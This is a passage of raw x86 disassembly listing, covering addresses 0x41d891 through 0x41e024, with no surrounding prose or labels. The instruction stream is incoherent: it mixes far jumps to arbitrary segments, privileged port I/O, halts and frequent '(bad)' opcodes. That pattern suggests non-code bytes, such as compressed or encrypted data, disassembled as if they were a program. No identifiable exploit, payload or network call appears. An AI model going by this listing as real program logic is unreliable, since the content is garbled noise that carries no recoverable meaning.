  41d891:	lea    esp,[ebx+0xdab57e7]
  41d897:	fistp  DWORD PTR [ebp+0x3eab7426]
  41d89d:	mov    DWORD PTR [ebx],eax
  41d89f:	inc    eax
  41d8a0:	pop    ax
  41d8a2:	dec    ecx
  41d8a3:	je     0x41d853
  41d8a5:	popa   
  41d8a6:	call   FWORD PTR [eax+0x11338f50]
  41d8ac:	rcl    ebp,1
  41d8ae:	cwde   
  41d8af:	std    
  41d8b0:	mov    bl,0xca
  41d8b2:	jmp    0x46af:0x2603e3cd
  41d8b9:	sar    DWORD PTR [ebp-0x1e],0x2a
  41d8bd:	icebp  
  41d8be:	test   bl,al
  41d8c0:	pop    es
  41d8c1:	add    edx,DWORD PTR [ecx-0x72f78466]
  41d8c7:	pushf  
  41d8c8:	cmp    eax,DWORD PTR [esi+0x27996517]
  41d8ce:	hlt    
  41d8cf:	pop    ss
  41d8d0:	xor    BYTE PTR [edi+0x5a847e56],al
  41d8d6:	adc    al,0xf0
  41d8d8:	lock inc ebp
  41d8da:	test   al,0x9f
  41d8dc:	xor    al,0x83
  41d8de:	lods   al,BYTE PTR ds:[esi]
  41d8df:	cmp    eax,0xcfa1fa71
  41d8e4:	cdq    
  41d8e5:	push   cs
  41d8e6:	arpl   ax,dx
  41d8e8:	xor    al,0x3
  41d8ea:	mov    ebx,0x2c8eeac1
  41d8ef:	mov    edi,DWORD PTR [ebx]
  41d8f1:	das    
  41d8f2:	or     BYTE PTR [ebx+0x748e5971],ch
  41d8f8:	mov    bh,ch
  41d8fa:	daa    
  41d8fb:	out    dx,al
  41d8fc:	mov    ch,0xa0
  41d8fe:	clc    
  41d8ff:	stc    
  41d900:	adc    al,0xc2
  41d902:	add    al,0xa4
  41d904:	lock in eax,0x2
  41d907:	and    DWORD PTR [ebp-0x23],esi
  41d90a:	cld    
  41d90b:	in     al,0x4a
  41d90d:	enter  0x8426,0xf2
  41d911:	sbb    DWORD PTR [esp+esi*4],esp
  41d914:	add    BYTE PTR [eax],al
  41d916:	dec    edx
  41d917:	fidiv  DWORD PTR [edi-0x75]
  41d91a:	fwait
  41d91b:	sbb    bl,BYTE PTR [ebx+0x5258eeb1]
  41d921:	push   esp
  41d922:	or     DWORD PTR [edx],edi
  41d924:	cmp    al,0x77
  41d926:	xor    eax,0x6186ab37
  41d92b:	sbb    eax,0x49b0ca5c
  41d930:	div    DWORD PTR [ecx-0x67]
  41d933:	nop
  41d934:	inc    ebx
  41d935:	jno    0x41d91f
  41d937:	ins    DWORD PTR es:[edi],dx
  41d938:	xor    edx,DWORD PTR [edi]
  41d93a:	inc    edi
  41d93b:	imul   eax,DWORD PTR [ecx+0x57],0x45e57128
  41d942:	push   ecx
  41d943:	cmp    DWORD PTR [esi-0x28],0x16acec9a
  41d94a:	mov    esp,0xda4d8d87
  41d94f:	pushf  
  41d950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d951:	sbb    edi,DWORD PTR gs:[ebp+0x3b]
  41d955:	outs   dx,DWORD PTR ds:[esi]
  41d956:	hlt    
  41d957:	test   eax,0x694c4663
  41d95c:	cmp    ebx,DWORD PTR [edi+0x22]
  41d95f:	add    edi,DWORD PTR [ebx+0x6d]
  41d962:	outs   dx,BYTE PTR ds:[esi]
  41d963:	push   ss
  41d964:	ins    BYTE PTR es:[edi],dx
  41d965:	scas   al,BYTE PTR es:[edi]
  41d966:	xchg   ebx,eax
  41d967:	jmp    0x61841c98
  41d96c:	(bad)  
  41d96e:	lahf   
  41d96f:	sub    eax,DWORD PTR [ebx-0x60]
  41d972:	cmp    dh,bl
  41d974:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d975:	mov    DWORD PTR [eax+0x1],0xa6660ae5
  41d97c:	xor    ebp,DWORD PTR [ebx+0x2551947f]
  41d982:	mov    esp,0x5a3511b2
  41d987:	test   BYTE PTR [eax*4+0x7d6f522a],ch
  41d98e:	cwde   
  41d98f:	cmp    ebp,DWORD PTR [ecx+eax*2+0x1ce58c85]
  41d996:	jmp    0x2467147
  41d99b:	test   DWORD PTR [ebx+0x54ac27e1],esp
  41d9a1:	jge    0x41d9a1
  41d9a3:	hlt    
  41d9a4:	test   eax,0x28cd551e
  41d9a9:	call   0x4656:0x5386
  41d9af:	jae    0x41d9b8
  41d9b1:	jmp    0xaa51:0xa43b41f8
  41d9b8:	pop    ss
  41d9b9:	and    al,0x3e
  41d9bb:	es push esi
  41d9bd:	mov    edi,0x35141dd3
  41d9c2:	cld    
  41d9c3:	lea    ebx,[esi+ebx*8+0x60]
  41d9c7:	mov    al,ds:0x760e674d
  41d9cc:	cmp    al,0xa1
  41d9ce:	pop    esp
  41d9cf:	jmp    0x4270:0x8d782a3a
  41d9d6:	in     al,0xdd
  41d9d8:	pop    edi
  41d9d9:	(bad)  
  41d9da:	jge    0x41da01
  41d9dc:	pop    eax
  41d9dd:	lods   al,BYTE PTR ds:[esi]
  41d9de:	ds test al,0x3d
  41d9e1:	aam    0x80
  41d9e3:	lds    ebx,FWORD PTR [eax+0x12e0c5a]
  41d9e9:	add    esi,DWORD PTR [edx-0x738f1ee3]
  41d9ef:	(bad)  [edx+edi*2-0x2d]
  41d9f3:	stos   BYTE PTR es:[edi],al
  41d9f4:	mov    cl,dl
  41d9f6:	cli    
  41d9f7:	sti    
  41d9f8:	(bad)  
  41d9fa:	sub    BYTE PTR [ecx],bl
  41d9fc:	and    al,0x1a
  41d9fe:	add    DWORD PTR [edi+0x39],ebx
  41da01:	cdq    
  41da02:	out    0xe4,eax
  41da04:	leave  
  41da05:	push   eax
  41da06:	and    al,0x52
  41da08:	pushf  
  41da09:	push   ecx
  41da0a:	pop    esp
  41da0b:	sbb    eax,0xbc51b8b2
  41da10:	js     0x41da4c
  41da12:	jns    0x41da26
  41da14:	in     eax,dx
  41da15:	mov    cl,0x64
  41da17:	xlat   BYTE PTR ds:[ebx]
  41da18:	aaa    
  41da19:	jecxz  0x41da20
  41da1b:	fs dec ebx
  41da1d:	(bad)  
  41da1e:	js     0x41da11
  41da20:	pushf  
  41da21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da22:	inc    ecx
  41da23:	sbb    dh,BYTE PTR [ebp-0x146acf26]
  41da29:	shl    DWORD PTR [ecx+edx*2-0x30],cl
  41da2d:	mov    cl,BYTE PTR [esi+0x9282bd1]
  41da33:	inc    DWORD PTR [eax]
  41da35:	call   0x1cc6:0x5d8143e
  41da3c:	daa    
  41da3d:	mov    fs,WORD PTR [edx+0x639a509a]
  41da43:	daa    
  41da44:	xchg   edi,eax
  41da45:	mov    edi,0x266ec8f1
  41da4a:	out    0xca,eax
  41da4c:	jge    0x41d9f6
  41da4e:	and    al,0x8d
  41da50:	cld    
  41da51:	shl    eax,0xf6
  41da54:	clc    
  41da55:	cmp    eax,0x91177749
  41da5a:	dec    esi
  41da5b:	cmp    DWORD PTR [ecx+0x4e],ebp
  41da5e:	or     edi,DWORD PTR [ebp+0x2139f79a]
  41da64:	mov    ch,0x6c
  41da66:	add    ah,BYTE PTR [esi+0xc53b8a6]
  41da6c:	and    al,0x9e
  41da6e:	imul   esp,DWORD PTR [ecx],0xffffffc9
  41da71:	mov    edi,0x109cfff8
  41da76:	icebp  
  41da77:	sti    
  41da78:	mov    bh,0x18
  41da7a:	fld    QWORD PTR [eax+0x3bd3d05c]
  41da80:	rcr    DWORD PTR [ebp+0x7a],cl
  41da83:	outs   dx,BYTE PTR ds:[esi]
  41da84:	mov    ecx,0x112ee256
  41da89:	cmc    
  41da8a:	ss pop edi
  41da8c:	cwde   
  41da8d:	in     al,0x76
  41da8f:	add    al,0x9c
  41da91:	fisttp WORD PTR [ebx+edi*2]
  41da94:	and    BYTE PTR [ecx+0x23],0x2a
  41da98:	stos   BYTE PTR es:[edi],al
  41da99:	int    0xba
  41da9b:	xor    DWORD PTR [esi],ebx
  41da9d:	in     al,0x87
  41da9f:	inc    ebx
  41daa0:	dec    esi
  41daa1:	add    ebp,DWORD PTR ss:[edx+0x3b01d972]
  41daa8:	cmp    dl,ah
  41daaa:	push   ecx
  41daab:	and    DWORD PTR [eax],edx
  41daad:	mov    ebp,0x9da5e4cc
  41dab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dab3:	sbb    BYTE PTR [ebx+0x5],ah
  41dab6:	dec    esp
  41dab7:	ja     0x41dae6
  41dab9:	mov    DWORD PTR [eax+edi*1+0x4d78a1f9],ebx
  41dac0:	sbb    BYTE PTR [eax],bl
  41dac2:	(bad)  
  41dac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dac5:	jbe    0x41db24
  41dac7:	mov    eax,ds:0x3e973620
  41dacc:	daa    
  41dacd:	rol    cl,1
  41dacf:	(bad)  
  41dad0:	jmp    0x41daa2
  41dad2:	or     DWORD PTR [edi-0x70c182df],ebx
  41dad8:	clc    
  41dad9:	cmp    eax,0x15f0836a
  41dade:	lods   eax,DWORD PTR ds:[esi]
  41dae0:	xor    al,0x88
  41dae2:	mov    edx,0xce695881
  41dae7:	inc    ecx
  41dae8:	shr    eax,1
  41daea:	int3   
  41daeb:	jmp    0x827:0xa7291d62
  41daf2:	lock push ds
  41daf4:	add    ebp,ebx
  41daf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41daf7:	lahf   
  41daf8:	cmp    eax,0x1b402ce4
  41dafd:	repz addr16 div dh
  41db01:	cmp    eax,0x43348735
  41db06:	add    eax,0x98a5e30f
  41db0b:	sub    eax,0x38ba2823
  41db10:	mov    cl,0x22
  41db12:	icebp  
  41db13:	pop    edx
  41db14:	dec    eax
  41db15:	push   ecx
  41db16:	add    al,0xd7
  41db18:	mov    edi,DWORD PTR [ebp+0x5d]
  41db1b:	pop    edi
  41db1c:	adc    BYTE PTR [edi-0x69ae87e4],al
  41db22:	dec    edx
  41db23:	pop    ss
  41db24:	aam    0x46
  41db26:	mov    ds:0xc1e89deb,eax
  41db2b:	(bad)  
  41db2d:	push   0x12
  41db2f:	add    ebx,DWORD PTR [ebp-0x47]
  41db32:	add    al,0xe6
  41db34:	jae    0x41db98
  41db36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db37:	stos   BYTE PTR es:[edi],al
  41db38:	pop    esi
  41db39:	sbb    eax,ecx
  41db3b:	and    BYTE PTR [ebx],bl
  41db3d:	stos   BYTE PTR es:[edi],al
  41db3e:	shl    DWORD PTR [edx+ebp*1],1
  41db41:	scas   al,BYTE PTR es:[edi]
  41db42:	call   DWORD PTR [eax-0x7f]
  41db45:	inc    edx
  41db46:	std    
  41db47:	sbb    al,0xbe
  41db49:	retf   
  41db4a:	sahf   
  41db4b:	mov    esp,0xf824491b
  41db50:	xor    al,dh
  41db52:	sub    eax,0x8349a8c8
  41db57:	mov    ah,0xe7
  41db59:	mov    dh,0xcf
  41db5b:	out    0x53,eax
  41db5d:	and    eax,0xb9a29e1
  41db62:	cld    
  41db63:	mov    ah,0x76
  41db65:	sub    BYTE PTR [ebx],ch
  41db67:	sub    BYTE PTR [eax-0x170058a8],ah
  41db6d:	mov    ah,0x2c
  41db6f:	arpl   bx,bx
  41db71:	in     eax,0x2d
  41db73:	dec    ax
  41db75:	addr16 hlt 
  41db77:	sub    BYTE PTR [eax+0x49],dl
  41db7a:	push   edx
  41db7b:	xlat   BYTE PTR gs:[ebx]
  41db7d:	jns    0x41db19
  41db7f:	push   ecx
  41db80:	stos   BYTE PTR es:[edi],al
  41db81:	cmp    cl,BYTE PTR [edx+0x38]
  41db84:	sub    esp,DWORD PTR [ecx]
  41db86:	jb     0x41db7d
  41db88:	or     BYTE PTR [ecx],cl
  41db8a:	ror    BYTE PTR [esi+0x63],1
  41db8d:	sub    esp,DWORD PTR [ebx]
  41db8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db90:	ror    esi,cl
  41db92:	loope  0x41dbdd
  41db94:	imul   ecx,DWORD PTR [edi+0x652e8c83],0xffffffc7
  41db9b:	pop    esi
  41db9c:	push   ds
  41db9d:	jmp    0x497b7b9c
  41dba2:	mov    al,ds:0xe8e5c1f5
  41dba7:	mov    al,ds:0xd70e667
  41dbac:	retf   
  41dbad:	pop    edi
  41dbae:	mul    al
  41dbb0:	popa   
  41dbb1:	dec    eax
  41dbb2:	addr16 dec esi
  41dbb4:	inc    eax
  41dbb5:	fistp  DWORD PTR [ecx]
  41dbb7:	mov    ds:0x5bda42b6,eax
  41dbbc:	adc    ch,BYTE PTR [esi+0x73082725]
  41dbc2:	call   esi
  41dbc4:	jne    0x6df09493
  41dbca:	mov    edi,0x137cb451
  41dbcf:	ffreep st(1)
  41dbd1:	bnd jb 0x41dbcb
  41dbd4:	jp     0x41db59
  41dbd6:	xchg   esp,eax
  41dbd7:	jns    0x41dc32
  41dbd9:	loop   0x41dbaf
  41dbdb:	cmp    bl,bl
  41dbdd:	adc    ebp,eax
  41dbdf:	repz xor dl,BYTE PTR [esi-0x249dcc47]
  41dbe6:	ret    
  41dbe7:	mov    dl,BYTE PTR [eax+0x6f]
  41dbea:	xor    ah,ah
  41dbec:	mov    edi,0x950b70cd
  41dbf1:	out    dx,al
  41dbf2:	mov    ds:0x873e8867,eax
  41dbf7:	cmp    esi,ebx
  41dbf9:	mov    eax,0xe4218d5c
  41dbfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbff:	mov    bh,0xe2
  41dc01:	popf   
  41dc02:	or     esp,DWORD PTR [eax-0x1ddfe15]
  41dc08:	push   esp
  41dc09:	pushf  
  41dc0a:	jl     0x41dc85
  41dc0c:	and    BYTE PTR [bp-0x20ab],0x0
  41dc12:	sub    DWORD PTR [ecx-0x3a96065e],esp
  41dc18:	(bad)  
  41dc19:	in     eax,dx
  41dc1a:	arpl   WORD PTR [esi],bp
  41dc1c:	sbb    ebx,DWORD PTR [edx+0x76]
  41dc1f:	imul   edx,DWORD PTR [ecx],0x18
  41dc22:	mov    ebp,0xb5418cc6
  41dc27:	sub    al,0x98
  41dc29:	(bad)  
  41dc2a:	cli    
  41dc2b:	pop    ds
  41dc2c:	sbb    esi,esi
  41dc2e:	pop    eax
  41dc2f:	cmp    DWORD PTR [ebx],esi
  41dc31:	jns    0x41dbf4
  41dc33:	or     edx,ecx
  41dc35:	add    esp,DWORD PTR [edx+0x1abb747f]
  41dc3b:	push   eax
  41dc3c:	int    0x57
  41dc3e:	loope  0x41dbe5
  41dc40:	loope  0x41dbe9
  41dc42:	xor    bh,BYTE PTR [ebx-0x71]
  41dc45:	(bad)  
  41dc46:	dec    edi
  41dc47:	pusha  
  41dc48:	jo     0x41dc36
  41dc4a:	sbb    BYTE PTR [esi+0x31],cl
  41dc4d:	nop
  41dc4e:	pop    esp
  41dc4f:	aad    0x2b
  41dc51:	stos   BYTE PTR es:[edi],al
  41dc52:	xchg   ebp,eax
  41dc53:	adc    al,0x4f
  41dc55:	jmp    FWORD PTR [eax+0x29]
  41dc58:	xchg   edx,eax
  41dc59:	xchg   ebx,eax
  41dc5a:	or     eax,DWORD PTR [edx]
  41dc5c:	push   ds
  41dc5d:	xchg   ebx,eax
  41dc5e:	mov    ebx,0xa6ae3b0c
  41dc63:	mov    bl,0x8
  41dc65:	loope  0x41dbeb
  41dc67:	xchg   edx,eax
  41dc68:	shr    DWORD PTR [edi],cl
  41dc6a:	aaa    
  41dc6b:	or     cl,BYTE PTR [edx]
  41dc6d:	sar    BYTE PTR [edx-0x27],1
  41dc70:	xchg   ecx,edx
  41dc72:	sub    al,ah
  41dc74:	ins    BYTE PTR es:[edi],dx
  41dc75:	fidiv  WORD PTR [eax-0x3dcf196a]
  41dc7b:	es pop esi
  41dc7d:	rol    BYTE PTR [ecx+0x6628d158],cl
  41dc83:	mov    dl,0x45
  41dc85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc86:	lea    edx,[ecx+0x21518050]
  41dc8c:	aas    
  41dc8d:	int    0x12
  41dc8f:	adc    eax,0x60eb3d26
  41dc94:	mov    bh,0x87
  41dc96:	xor    al,BYTE PTR [edx-0x13361ed6]
  41dc9c:	iret   
  41dc9d:	call   0xfcf0:0x57328ac4
  41dca4:	add    eax,0x1b91669d
  41dca9:	inc    esp
  41dcaa:	ja     0x41dd0b
  41dcac:	push   ss
  41dcad:	inc    ebp
  41dcae:	push   cs
  41dcaf:	add    DWORD PTR [ecx+0x11ab601d],esp
  41dcb5:	jns    0x41dce1
  41dcb7:	test   al,0x91
  41dcb9:	sbb    al,0xea
  41dcbb:	mov    ch,0xc6
  41dcbd:	and    eax,0x99df0c75
  41dcc2:	jmp    0x41dcad
  41dcc4:	cmp    ebx,DWORD PTR [eax+0xf0cf5cf]
  41dcca:	or     bl,BYTE PTR [edi-0xe49238]
  41dcd0:	jbe    0x41dc56
  41dcd2:	call   0x970d:0xff2c2937
  41dcd9:	into   
  41dcda:	outs   dx,BYTE PTR ds:[esi]
  41dcdb:	cmp    al,0x1b
  41dcdd:	xor    eax,0x7410e9f0
  41dce2:	repz cld 
  41dce4:	lahf   
  41dce5:	jle    0x41dc70
  41dce7:	fisttp WORD PTR [ecx+edx*1]
  41dcea:	push   es
  41dceb:	or     DWORD PTR [ecx+0x14],ecx
  41dcee:	jmp    0x6dbbd3e8
  41dcf3:	or     al,0x28
  41dcf5:	ror    DWORD PTR [esi+0x7b],cl
  41dcf8:	sub    ch,ah
  41dcfa:	mov    DWORD PTR [esi-0x395a5500],esp
  41dd00:	mov    ebx,0xef3b76b9
  41dd05:	cmp    esi,DWORD PTR [ebx-0x13d4ff88]
  41dd0b:	sub    DWORD PTR [ebx+0x1d41791e],ecx
  41dd11:	pop    ebx
  41dd12:	jne    0x41dcb7
  41dd14:	iret   
  41dd15:	mov    ecx,DWORD PTR [esi+0x6ba2a5f4]
  41dd1b:	pop    ebx
  41dd1c:	pop    esi
  41dd1d:	cmp    eax,0x1f40368b
  41dd22:	sub    bl,0xfe
  41dd25:	sbb    bl,dh
  41dd27:	loope  0x41dda4
  41dd29:	pop    ds
  41dd2a:	fnsave [edx-0x6a8f931a]
  41dd30:	xor    ah,BYTE PTR [esi-0x59]
  41dd33:	cs push eax
  41dd35:	(bad)  
  41dd36:	scas   al,BYTE PTR es:[edi]
  41dd37:	sub    cl,dh
  41dd39:	stc    
  41dd3a:	test   al,0xf2
  41dd3c:	xchg   ecx,esp
  41dd3e:	mov    esi,0x8c41645a
  41dd43:	or     BYTE PTR [ebx],dh
  41dd45:	xchg   edi,eax
  41dd46:	adc    DWORD PTR [ebp-0x36],ebx
  41dd49:	and    BYTE PTR [ecx],0x53
  41dd4c:	pop    ebx
  41dd4d:	lds    esp,FWORD PTR [edx+0x6f]
  41dd50:	dec    ecx
  41dd51:	ins    BYTE PTR es:[edi],dx
  41dd52:	jne    0x41dd9a
  41dd54:	jbe    0x41dd9c
  41dd56:	pop    esp
  41dd57:	xor    al,0x1d
  41dd59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd5a:	outs   dx,DWORD PTR ds:[esi]
  41dd5b:	pop    ebp
  41dd5c:	inc    edx
  41dd5d:	sub    eax,DWORD PTR [ebp-0x16134faf]
  41dd63:	mov    ecx,0xcdb197cd
  41dd68:	xchg   BYTE PTR [ecx-0x227bdb2e],al
  41dd6e:	inc    esp
  41dd6f:	sbb    dh,BYTE PTR [edi]
  41dd71:	loope  0x41dd62
  41dd73:	mov    ds:0x43e64a9f,al
  41dd78:	or     eax,0xedfc6f19
  41dd7d:	adc    edi,ecx
  41dd7f:	or     ecx,0x61b558d
  41dd85:	pusha  
  41dd86:	push   ebx
  41dd87:	out    0x52,eax
  41dd89:	sbb    BYTE PTR [esp+ebx*4+0x973c303],al
  41dd90:	ror    BYTE PTR [esi-0x3d],cl
  41dd93:	xchg   edx,eax
  41dd94:	stc    
  41dd95:	bound  eax,QWORD PTR [eax+0x4bc82ebe]
  41dd9b:	xor    al,0x15
  41dd9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd9e:	inc    ecx
  41dd9f:	das    
  41dda0:	jne    0x41ddb9
  41dda2:	(bad)  
  41dda3:	jecxz  0x41dd26
  41dda5:	sti    
  41dda6:	(bad)  
  41dda7:	jns    0x41de20
  41dda9:	inc    edx
  41ddaa:	inc    ebx
  41ddab:	and    BYTE PTR [esi-0x63],ch
  41ddae:	scas   eax,DWORD PTR es:[edi]
  41ddaf:	jne    0x41dd48
  41ddb1:	push   0x6e
  41ddb3:	inc    esi
  41ddb4:	xor    edx,DWORD PTR [ecx+0x483211f1]
  41ddba:	cs es add al,0x51
  41ddbe:	jp     0x41dd89
  41ddc0:	xchg   DWORD PTR [eax-0x6690b8c4],esp
  41ddc6:	xor    eax,DWORD PTR [edx+0x3d]
  41ddc9:	cmp    eax,0x82ed6779
  41ddce:	jo     0x41ddd3
  41ddd0:	xchg   edx,eax
  41ddd1:	enter  0x3056,0x98
  41ddd5:	xor    eax,0x97606616
  41ddda:	push   ebx
  41dddb:	mov    BYTE PTR [edx+0x38],al
  41ddde:	call   0xb7b03001
  41dde3:	cmpxchg BYTE PTR [ecx+0x2a],al
  41dde7:	xchg   ebx,eax
  41dde8:	mov    edx,0xd5f64ffd
  41dded:	outs   dx,DWORD PTR ds:[esi]
  41ddee:	(bad)  
  41ddf0:	je     0x41dd8c
  41ddf2:	xor    ebp,DWORD PTR [ecx]
  41ddf4:	call   0xa73b:0x7945a5f0
  41ddfb:	outs   dx,DWORD PTR ds:[esi]
  41ddfc:	mov    esp,0x3d09445e
  41de01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de02:	add    BYTE PTR [edx-0x7b07d4],dl
  41de08:	xor    eax,0x2864c0ca
  41de0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de0e:	addr16 push 0xffffffbd
  41de11:	mov    WORD PTR [ebp-0x2b3f7c93],?
  41de17:	icebp  
  41de18:	xor    al,0x16
  41de1a:	xchg   esp,eax
  41de1b:	ins    BYTE PTR es:[edi],dx
  41de1c:	push   ds
  41de1d:	dec    edi
  41de1e:	sub    cl,BYTE PTR [ecx+0x5a]
  41de21:	test   DWORD PTR [edx],esp
  41de23:	scas   al,BYTE PTR es:[edi]
  41de24:	lahf   
  41de25:	sub    edx,DWORD PTR [esi-0x20878ab3]
  41de2b:	loop   0x41ddca
  41de2d:	xchg   ebp,eax
  41de2e:	sub    edx,DWORD PTR [ebx]
  41de30:	rcl    BYTE PTR [esi+0x6da21394],cl
  41de36:	adc    al,0x49
  41de38:	jne    0x41de03
  41de3a:	mov    al,ds:0x428abc5a
  41de3f:	hlt    
  41de40:	(bad)  
  41de41:	mov    cs,WORD PTR [ebx]
  41de43:	jmp    0xdd8e2799
  41de48:	or     edx,DWORD PTR [eax]
  41de4a:	mov    bl,BYTE PTR [ecx+ebx*1-0x3a]
  41de4e:	fwait
  41de4f:	inc    esi
  41de50:	or     cl,BYTE PTR [eax-0x6d]
  41de53:	pushf  
  41de54:	xor    eax,0xf24f420
  41de59:	js     0x41de4e
  41de5b:	out    0x32,eax
  41de5d:	or     DWORD PTR [esi-0x1ddd682],0x66429028
  41de67:	push   ds
  41de68:	cmp    eax,0xa01e39da
  41de6d:	jmp    0x2327cdc1
  41de72:	and    DWORD PTR [ebx],0x11
  41de75:	dec    esi
  41de76:	xchg   esi,eax
  41de77:	inc    ebp
  41de78:	jne    0x41de4c
  41de7a:	jmp    0x8779:0xcf4cf746
  41de81:	pop    edi
  41de82:	loop   0x41de20
  41de84:	xchg   bh,dl
  41de86:	sti    
  41de87:	enter  0xada2,0xd
  41de8b:	mov    eax,0x9e48fcef
  41de90:	retf   0xb21b
  41de93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de94:	xchg   ecx,eax
  41de95:	and    eax,0x7e60dd4f
  41de9a:	pop    esi
  41de9b:	les    edi,FWORD PTR [ecx-0x4c]
  41de9e:	inc    eax
  41de9f:	jg     0x41de61
  41dea1:	out    dx,al
  41dea2:	adc    eax,0x28868bf9
  41dea7:	les    eax,FWORD PTR [eax+0x2d0d28c9]
  41dead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deae:	add    BYTE PTR [edi+0x6e],0x1e
  41deb2:	rcl    DWORD PTR [ebx-0x26cf035b],1
  41deb8:	imul   ebx,DWORD PTR [edx+esi*4-0x3a],0xffffff8b
  41debd:	mov    ?,WORD PTR [ecx]
  41debf:	int3   
  41dec0:	fsubr  st,st(3)
  41dec2:	inc    ebx
  41dec3:	pop    ds
  41dec4:	dec    BYTE PTR [esi+ecx*8+0x8e2a223]
  41decb:	enter  0x5216,0x84
  41decf:	loopne 0x41df3a
  41ded1:	mov    WORD PTR [ecx-0x55],fs
  41ded4:	mov    edi,ebp
  41ded6:	cwde   
  41ded7:	lods   al,BYTE PTR ds:[esi]
  41ded8:	add    eax,0x715859a9
  41dedd:	shl    BYTE PTR [ecx-0x69],cl
  41dee0:	mov    al,ds:0x814c664
  41dee5:	xchg   edi,eax
  41dee6:	jl     0x41df11
  41dee8:	imul   esi,DWORD PTR [eax+0x39],0x76
  41deec:	add    DWORD PTR [edx+0x5a3ff9f0],esp
  41def2:	call   0xf75a753b
  41def7:	in     eax,dx
  41def8:	or     BYTE PTR [edx],cl
  41defa:	int3   
  41defb:	cmc    
  41defc:	adc    al,0x6
  41defe:	jmp    0xb309:0x1340d881
  41df05:	add    al,0xd2
  41df07:	push   es
  41df08:	mov    edi,DWORD PTR [edi+0xf]
  41df0b:	mov    BYTE PTR [ecx-0x70],0x9a
  41df0f:	inc    eax
  41df10:	arpl   WORD PTR [ecx-0x7f7fe373],dx
  41df16:	(bad)  
  41df17:	out    dx,eax
  41df18:	int    0xeb
  41df1a:	or     DWORD PTR [esi-0x19371787],edx
  41df20:	(bad)  
  41df22:	icebp  
  41df23:	fild   QWORD PTR [ecx+0x62]
  41df26:	sbb    cl,bl
  41df28:	js     0x41df63
  41df2a:	xchg   ebx,eax
  41df2b:	dec    edx
  41df2c:	(bad)  
  41df2d:	frstor [ecx+ebp*8-0x12e2307f]
  41df34:	popf   
  41df35:	sti    
  41df36:	pop    ds
  41df37:	mov    ds:0xd287e2ef,eax
  41df3c:	out    0xa4,al
  41df3e:	es lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41df42:	lahf   
  41df43:	pushf  
  41df44:	push   esp
  41df45:	jp     0x41df3e
  41df47:	scas   al,BYTE PTR es:[edi]
  41df48:	push   edi
  41df49:	push   es
  41df4a:	cdq    
  41df4b:	ss jg  0x41df18
  41df4e:	fsubr  st,st(7)
  41df50:	mov    ch,0x4c
  41df52:	and    BYTE PTR [ebx-0x16c03f2e],dh
  41df58:	push   0x42
  41df5a:	scas   eax,DWORD PTR es:[edi]
  41df5b:	and    ebp,DWORD PTR [ecx-0x7bfc5bef]
  41df61:	aas    
  41df62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df63:	cmp    al,bl
  41df65:	clc    
  41df66:	mov    DWORD PTR [edi],edi
  41df68:	cs jb  0x41dfcc
  41df6b:	lahf   
  41df6c:	adc    eax,0x529b4c44
  41df71:	jb     0x41dfcd
  41df73:	xor    dl,BYTE PTR [ebp+ebp*8+0x7e4a3a84]
  41df7a:	ss xor sp,di
  41df7e:	mov    cl,0xbf
  41df80:	pop    ss
  41df81:	inc    edi
  41df82:	ds push ecx
  41df84:	push   ecx
  41df85:	dec    esi
  41df86:	push   ss
  41df87:	cmp    DWORD PTR [ebx],0xd027ad10
  41df8d:	repnz add esp,DWORD PTR [esi+0x26]
  41df91:	fsubrp st(0),st
  41df93:	mov    ecx,0x5812ac3e
  41df98:	cmp    ebp,esi
  41df9a:	in     eax,dx
  41df9b:	push   0xcf25e19e
  41dfa0:	cwde   
  41dfa1:	mov    bh,0xc7
  41dfa3:	mov    esi,0x1b0a18f1
  41dfa8:	mov    fs,edi
  41dfaa:	pop    es
  41dfab:	pop    ds
  41dfac:	sbb    BYTE PTR [ecx-0x73f6c7f4],0xb6
  41dfb3:	add    ch,BYTE PTR cs:[ebx]
  41dfb6:	mov    eax,0x1ad77294
  41dfbb:	mov    edx,0x937da740
  41dfc0:	popa   
  41dfc1:	mov    esi,0x8f7995ee
  41dfc6:	add    eax,DWORD PTR [ebx+eiz*4+0x25]
  41dfca:	mov    bh,0xb6
  41dfcc:	int    0x2f
  41dfce:	mov    ebx,0x7fcd5354
  41dfd3:	push   0x9ef3c13e
  41dfd8:	sar    BYTE PTR [esi],cl
  41dfda:	daa    
  41dfdb:	pop    eax
  41dfdc:	jno    0x41e045
  41dfde:	xor    DWORD PTR [ecx+ebp*8+0x52],0xa194b6e0
  41dfe6:	mov    eax,0x74fd05f8
  41dfeb:	movq   QWORD PTR [ebp+0x63],mm4
  41dfef:	push   edx
  41dff0:	xor    bh,BYTE PTR [edx]
  41dff2:	and    al,0x54
  41dff4:	and    al,0x2
  41dff6:	fst    DWORD PTR [ecx+eax*1+0x7]
  41dffa:	lods   al,BYTE PTR ds:[esi]
  41dffb:	cmp    ebp,esi
  41dffd:	fcomp  DWORD PTR [ebx-0x7e]
  41e000:	mov    ebx,0x6eb0107
  41e005:	xchg   ecx,eax
  41e006:	dec    edx
  41e007:	cmp    al,0xb8
  41e009:	dec    edi
  41e00a:	test   DWORD PTR [edi-0x1f6dcd08],ecx
  41e010:	pop    ebp
  41e011:	leave  
  41e012:	nop
  41e013:	pop    ds
  41e014:	js     0x41dfbf
  41e016:	dec    ecx
  41e017:	sub    esi,DWORD PTR [edi-0x77d93093]
  41e01d:	or     BYTE PTR [esi+esi*2+0xe3cf565],dh
  41e024:	cmp    DWORD PTR [ebp+ebx*8-0x5fe56dda],0xffffff9f
